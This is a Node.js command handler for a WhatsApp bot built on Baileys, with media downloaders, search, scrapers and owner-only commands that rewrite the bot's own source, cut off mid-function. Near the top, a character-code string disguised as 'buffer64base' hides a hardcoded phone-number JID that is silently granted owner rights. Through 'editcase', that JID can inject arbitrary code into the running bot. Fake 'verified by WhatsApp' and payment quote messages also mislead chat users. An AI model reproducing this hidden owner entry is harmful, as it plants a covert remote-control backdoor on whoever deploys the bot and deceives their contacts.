process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const FormData = require("form-data");
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { GoogleGenerativeAI } = require("@google/generative-ai");
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { pinterest, pinterest2, remini, tiktokDl } = require('./lib/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function');


module.exports = xyu = async (xyu, m, chatUpdate, store) => {
	try {
await LoadDataBase(xyu, m)
const from = m.key.remoteJid
const botNumber = await xyu.decodeJid(xyu.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const sender = m.key.fromMe ? (xyu.user.id.split(':')[0]+'@s.whatsapp.net' || xyu.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
try {
ppuser = await xyu.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/0arg0u.jpg'
}
ppnyauser = await getBuffer(ppuser)

//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const verif = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "_𝐓𝐚𝐤𝐚𝐬𝐡𝐢 - 𝐁𝐨𝐭𝐳 Telah Terverifikasi Oleh WhatsApp_"
}
}
};

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

const sendReaction = async reactionContent => {
  xyu.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

//============= [ EVENT GROUP ] ===============================================


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

async function uploadToCatbox(filePath) {
            const form = new FormData();
            form.append('fileToUpload', fs.createReadStream(filePath)); // file yang diupload
            form.append('reqtype', 'fileupload'); // reqtype harus "fileupload"
          
            try {
              const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                  ...form.getHeaders(),
                },
              });
          
              if (response.data) {
                // Ambil hanya nama file yang diunggah
                const filename = response.data.trim();
                return `${filename}`;
              } else {
                throw new Error('Gagal mendapatkan URL dari Catbox.');
              }
            } catch (error) {
              console.error('Error uploading to Catbox:', error.message);
              throw error;
            }
          }

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }
        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }
            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return xyu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}

async function replymenu(wow) {
    xyu.sendMessage(
         m.chat,
{
         document: fs.readFileSync("./package.json"),
         fileName: `Haii ${pushname}`,
         fileLength: "99999999999999",
         caption: wow,
         mimetype: "image/png",
         headerType: 9,
         jpegThumbnail: fkethmb,
        caption: wow,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: false,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "xʏᴜʀᴀ -ᴍᴏᴅs",
                newsletterJid: "120363324795151892@newsletter",
            },
            externalAdReply: {  
                title: global.foter, 
                body: '©𝐓𝐚𝐤𝐚𝐬𝐡𝐢 - 𝐁𝐨𝐭𝐳',
                thumbnail: fs.readFileSync("./src/media/thumb.jpg"), // Menggunakan path lokal
                sourceUrl: global.url, 
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: verif });
}

const reply = (teks) => {
            xyu.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: false,
        "externalAdReply": {
            "showAdAttribution": false,
            "containsAutoReply": true,
            "title": `Ｘｙｕｒａ - ｍｏｄｓ`,
            "body": `☣︎ᵛᶦʳᵘˢ☣︎`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./src/media/thumb.jpg`),
            "sourceUrl": `https://taplink.cc/xyuraa`
        }
    }
},
{ quoted: verif })
        }

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true;
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"));
const xyuradev = { xyu, toIDR, isCreator, reply, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, args, sleep, botNumber };

for (let plugin of plugins) {
  // don delete may we em 😂
  if (Array.isArray(plugin.command) && plugin.command.find(e => e == command.toLowerCase())) {
    pluginsDisable = false;
    if (typeof plugin !== "function") return;
    await plugin(m, xyuradev);
  }
}

if (!pluginsDisable) return;
//============= [ COMMANDS ] ====================================================



switch (command) {
case 'play': {
    if (!text) return reply(`Example : ${prefix + command} membasuh`)
    let wait = await xyu.sendMessage(m.chat, {
        text: `_Searching.. [ ${text} ] 🔍_`
    }, {
        quoted: verif,
        ephemeralExpiration: 86400
    })
    let search = await yts(`${text}`)
    let data = await search.all.filter((v) => v.type == 'video')
    try {
        var res12 = data[0]
    } catch {
        var res12 = data[1]
    }
    let ply = search.videos[0].url
    let pl = await Scraper.Ytdl.download(ply, 'mp3', '128')
    await xyu.sendMessage(m.chat, {
        text: `_Mengirim.. [ ${text} ] _💬`,
        edit: wait.key
    }, {
        quoted: verif,
        ephemeralExpiration: 86400
    });
    await xyu.sendMessage(m.chat, {
        audio: pl.buffer,
        mimetype: 'audio/mp4',
        ptt: false 
    }, { quoted: verif })
    xyu.sendMessage(m.chat, {
        react: {
            text: '🎧',
            key: m.key
        }
    })
    break
}


//===============================================================================

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await xyu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case 'ig': case 'instagram': {
        if (!q) return m.reply(`Anda perlu memberikan URL video atau reel.`);
        try {
                const { igdl } = require('btch-downloader');
                const data = await igdl(text);
                if (!data || data.length === 0) return m.reply(`Tidak ada video atau gambar ditemukan.`);
                const mediaURL = data[0].url;
                await xyu.sendMessage(m.chat, { video: { url: mediaURL } }, { quoted: m });
        } catch (error) {
                return m.reply(`Terjadi kesalahan: ${error.message}`);
        }
}
break

//================================================================================

case 'tiktok':
case 'tt': {
if (!m.quoted && !text) return reply('reply')
    if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
    const api = require('btch-downloader')
    if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
    if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);
    let link = text || m.quoted.text; // Gunakan teks dari reply jika text tidak diberikan
    if (!link) return reply('Mana Kak Linknya?');
    try {
        await xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
        let maximus = await api.ttdl(args[0]);
        let caption = `乂 *T I K T O K  D O W N L O A D* \n\n• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* \n${maximus.title}\n\n• *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* \n${maximus.title_audio}\n\n${global.botname}`;
        
        await xyu.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption });
        await xyu.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m });
        await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.log(e);
        reply(e);
    }
}
break

//================================================================================

case 'renamecase':
    if (!q) return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    if (!isCreator) return m.reply('Khusus owner');
    // Pisahkan input menjadi nama case lama dan nama case baru
    const [oldCaseName, newCaseName] = q.split('|').map(name => name.trim());
    if (!oldCaseName || !newCaseName) {
        return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    }
    // Path ke file yang berisi switch-case
    const rinembos = path.join(__dirname, 'case.js');
    try {
        // Baca file secara sinkron
        let data = fs.readFileSync(rinembos, 'utf8');
        // Ekspresi reguler untuk mencari case berdasarkan nama lama
        const caseRegex = new RegExp(`case\\s+'${oldCaseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);
        if (startIndex === -1) {
            return m.reply(`Case '${oldCaseName}' tidak ditemukan.`);
        }
// Cari case berikutnya setelah case yang dicari
        const nextCasePattern = /case\s+'/g;
        nextCasePattern.lastIndex = startIndex + 1;
        const nextCaseMatch = nextCasePattern.exec(data);
        // Update nama case
        const updatedData = data.replace(caseRegex, `case '${newCaseName}':`);
        // Tulis kembali ke file
        fs.writeFileSync(rinembos, updatedData, 'utf8');
        m.reply(`Case '${oldCaseName}' sukses menjadi '${newCaseName}'!`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat membaca atau menulis file.');
    }
    break;
    
//================================================================================

    case 'editcase':
    if (!q) return m.reply('Mana case yang ingin diedit? Format: .editcase case \'namafitur\':\n\n<kode baru>');
    if (!isCreator) return m.reply('Khusus owner');
    const caseNameRegex = /case\s+'([^']+)':/; 
    const match = q.match(caseNameRegex);
    if (!match) {
        return m.reply('Format tidak benar. Contoh: .editcase case \'namafitur\':\n\n<kode baru>');
    }
    const caseName = match[1]; 
    const newCode = q.replace(caseNameRegex, '').trim(); 
    const filenyabang = path.join(__dirname, 'case.js');

    try {
        
        let data = fs.readFileSync(filenyabang, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${caseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);
            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }           
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);

            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }
            if (endIndex !== -1) {
                const updatedCode = `case '${caseName}':\n${newCode}\n`;
                data = data.slice(0, startIndex) + updatedCode + data.slice(endIndex);
                fs.writeFileSync(filenyabang, data, 'utf8');
                m.reply(`Succesfully update case ${q}!`);
            } else {
                m.reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            m.reply('Sorry, case nya gada di file case.js');
        }
    } catch (err) {
        console.error(err);
        m.reply('Eror, silahkan cek console untuk lihat apa yang eror');
    }
    break;

//================================================================================

case 'sf': case 'sfile': case 'sfiledl': case 'sfdl': {

if (!text.includes('https://sfile.mobi')) return reply(`• *Example :* .${command} https://sfile.mobi/xxxxxxx/`)

reply(mess.wait)

/*
💥 *SFILE DOWNLOADER*

💨 Options:
- Search (Query) + Page
- Top Trending + Page
- Latest Upload + Page
- Download

🧑‍💻 Script Code by Daffa
*/

const sfile = {
 latest_uploads: async function(page = 1) {
 try {
 const res = await axios.get('https://sfile.mobi');
 const cookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
 const headers = {
 'cookie': cookies,
 'referer': 'https://sfile.mobi/uploads.php',
 'user-agent': 'Postify/1.0.0'
 };
 const uploads = await axios.get(`https://sfile.mobi/uploads.php?page=${page}`, { headers });
 const $ = cheerio.load(uploads.data);

 const data = $('.list').map((_, el) => ({
 title: $(el).find('a').text().trim(),
 link: $(el).find('a').attr('href'),
 size: $(el).find('small').text().match(/(\d+(?:\.\d+)?\s[KMGT]B)/)?.[1],
 uploadDate: $(el).find('small').text().match(/Uploaded:\s([\d\-a-zA-Z]+)/)?.[1]
 })).get().filter(item => item.title && item.link && item.size && item.uploadDate);

 return { creator: 'Daffa ~', status: 'success', code: 200, data };
 } catch (error) {
 console.error(error);
 return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the latest updates.' };
 }
 },

 top_trending: async function(page = 1) {
 try {
 const response = await axios.get('https://sfile.mobi');
 const cookies = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
 const headers = {
 'authority': 'sfile.mobi',
 'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7',
 'cookie': cookies,
 'referer': `https://sfile.mobi/top.php?page=${page}`,
 'user-agent': 'Postify/1.0.0'
 };
 const top = await axios.get(`https://sfile.mobi/top.php?page=${page}`, { headers });
 const $ = cheerio.load(top.data);

 const data = $('.list').map((_, el) => {
 const title = $(el).find('a').text().trim();
 const link = $(el).find('a').attr('href');
 const [size, downloadInfo] = $(el).find('small').text().split(', Download: ').map(e => e.trim());
 const [downloadCount, uploadedDate] = downloadInfo ? downloadInfo.split(' Uploaded: ').map(e => e.trim()) : [undefined, undefined];

 return title && link && size && downloadCount && uploadedDate ? 
 { title, link, size, downloadCount, uploadDate: uploadedDate } : null;
 }).get().filter(item => item);

 return { creator: 'Daffa ~', status: 'success', code: 200, data };
 } catch (error) {
 console.error(error);
 return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the top trending files.' };
 }
 },
 
 search: async function(query, page = 1) {
 try {
 const url = `https://sfile.mobi/search.php?q=${query}&page=${page}`;
 const response = await axios.get(url, {
 headers: {
 'authority': 'sfile.mobi',
 'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
 'referer': url,
 'user-agent': 'Postify/1.0.0'
 }
 });

 const $ = cheerio.load(response.data);
 
 const data = $('.list').map((_, el) => {
 const title = $(el).find('a').text().trim();
 const link = $(el).find('a').attr('href');
 const sizeMatch = $(el).text().match(/\(([^)]+)\)$/);
 const size = sizeMatch ? sizeMatch[1] : undefined;
 return title ? { title, link, size } : null;
 }).get();

 return { creator: 'Daffa ~', status: 'success', code: 200, data };
 } catch (error) {
 console.error(error);
 return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching search results.' };
 }
 },
 
 download: async function(url) {
 const headers = {
 'referer': url,
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
 'accept-language': 'en-US,en;q=0.9',
 'user-Agent': 'Postify/1.0.0',
 };

 try {
 const response = await axios.get(url, { headers });
 headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

 const [filename, mimetype, downloadLink] = [
 response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
 response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
 response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
 ];
 
 if (!downloadLink) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Download link tidak ditemukan!' };

 headers.Referer = downloadLink;
 const final = await axios.get(downloadLink, { headers });

 const [directLink, key, filesize] = [
 final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
 final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
 final.data.match(/Download File \((.*?)\)/)?.[1]
 ];

 const result = directLink + (key ? `&k=${key}` : '');
 if (!result) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Direct Link Download tidak ditemukan!' };

 const data = await this.convert(result, url);

 return { creator: 'Daffa ~', status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
 } catch (error) {
 return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: error };
 }
 },

 convert: async function(url, directLink) {
 try {
 const init = await axios.get(url, {
 maxRedirects: 0,
 validateStatus: status => status >= 200 && status < 303,
 headers: {
 'Referer': directLink,
 'User-Agent': 'Postify/1.0.0'
 },
 });

 const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
 const redirect = init.headers.location;

 const final_result = await axios.get(redirect, {
 responseType: 'arraybuffer',
 headers: {
 'referer': directLink,
 'user-agent': 'Postify/1.0.0',
 'cookie': cookies,
 },
 });

 const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Tidak diketahui';
 return {
 filename,
 mimeType: final_result.headers['content-type'],
 buffer: Buffer.from(final_result.data)
 };
 } catch (error) {
 throw error;
 }
 }
};

try {
let hasil = await sfile.download(text)
let { filename, filesize, mimetype } = hasil.data
let sfdl = hasil.data.result
let sfcap = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - sғ ]* ── .々─ᯤ\n`
sfcap += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
sfcap += `│ =〆 ᴛʏᴘᴇ : ${mimetype}\n`
sfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${filesize}\n`
sfcap += `│ =〆 ᴜʀʟ : ${text}\n`
sfcap += `⏤͟͟͞͞╳────────── .✦`

await xyu.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename, caption: sfcap }, {quoted:m});
sendReaction("✅")
} catch (err) {
sendReaction("❌")
}}
break
//================================================================================

case 'setppbot': {
				if (!isCreator) return m.reply(mess.owner)
				if (!/image/.test(mime)) return m.reply(`Reply Image Dengan Caption ${prefix + command}`)
				let media = await xyu.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
				if (text.length > 0) {
					let { img } = await generateProfilePicture(media)
					await xyu.query({
						tag: 'iq',
						attrs: {
							to: botNumber,
							type: 'set',
							xmlns: 'w:profile:picture'
						},
						content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]
					})
					await fs.unlinkSync(media)
					m.reply('Sukses')
				} else {
					await xyu.updateProfilePicture(botNumber, { url: media })
					await fs.unlinkSync(media)
					m.reply('Sukses')
				}
			}
			break
//================================================================================

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await xyu.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break

//================================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await xyu.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await xyu.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case 'cekkhodam': 
case 'cekkodam':
    if (!text) return reply('Nama nya?');
    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }
    // Daftar nama khodam acak
    const ceknyaa = pickRandom([
        "Kaleng Cat Avian", "Pipa Rucika", "Botol Tupperware", "Badut Mixue", 
        "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan", 
        "Upin", "Ipin", "Sungut Lele", "Tok Dalang", "Opah", "Opet", "Alul", 
        "Pak Vinsen", "Maman Resing", "Pak RT", "Admin ETI", "Bung Towel", 
        "Lumpia Basah", "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", 
        "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan", "Nasi Kucing", 
        "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang", 
        "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", 
        "Sayur Asem", "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", 
        "Lintah Terbang", "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", 
        "Beat Mber", "Supra Geter", "Oli Samping", "Knalpot Racing", "Jus Stroberi", 
        "Jus Alpukat", "Alpukat Kocok", "Es Kopyor", "Es Jeruk", "Cappucino Cincau", 
        "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu", 
        "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Tutup Panci", 
        "Kotak Amal", "Tutup Termos", "Tutup Botol", "Kresek Item", "Kepala Casan", 
        "Ban Serep", "Kursi Lipat", "Kursi Goyang", "Kulit Pisang", "Warung Madura", 
        "Gorong-gorong", "Tai Kuda", "Tikus Kentut", "Banteng Merah", "Bajigur", 
        "Bakso Sumatra", "Neymar Bogor", "Christiano Rojali", "Batagor", 
        "Seblak Kalimantan", "Macan Putih", "Harimau Sumatra", "Harimau Putih", 
        "Singa", "Raja Iblis", "Telur Betawi", "Cilok Goreng"
    ]);
    const damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'lahir']);
    const khodam = `Khodam ${text}, adalah ${ceknyaa}, mendampingi dari ${damping}`;
    const ttsUrl = googleTTS.getAudioUrl(khodam, {
        lang: 'id', // Bahasa Indonesia
        slow: false, // Kecepatan bicara normal
        host: 'https://translate.google.com', // Host Google TTS
    });
    // Kirim pesan berupa audio
    xyu.sendMessage(m.chat, {
        audio: { url: ttsUrl },
        mimetype: 'audio/mpeg',
        ptt: true
    }, { quoted: m });
    break;
//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
